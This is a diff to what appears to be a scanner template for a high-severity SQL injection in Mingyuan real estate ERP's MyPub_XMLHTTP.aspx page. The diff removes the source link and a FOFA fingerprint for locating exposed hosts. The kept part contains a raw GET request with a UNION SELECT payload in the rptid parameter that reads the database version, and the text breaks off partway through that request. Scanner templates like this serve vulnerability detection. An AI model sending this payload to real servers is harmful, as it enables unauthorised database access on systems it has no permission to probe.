@@ -3,12 +3,8 @@ info:
   name: 明源地产ERP MyPub_XMLHTTP.aspx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xg3i1pzuk25gi79t'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xg3i1pzuk25gi79t
-    fofa: body="/_common/scripts/md5-min.js"
 http:
 - raw:
   - 'GET /Sldzkp/DZKP/MyPub_XMLHTTP.aspx/?ywtype=GETPRINTVAL&rptid=1%27+UNION+ALL+SELECT+NULL%2C%40%40version%2CNULL%2CNULL-- HTTP/1.1
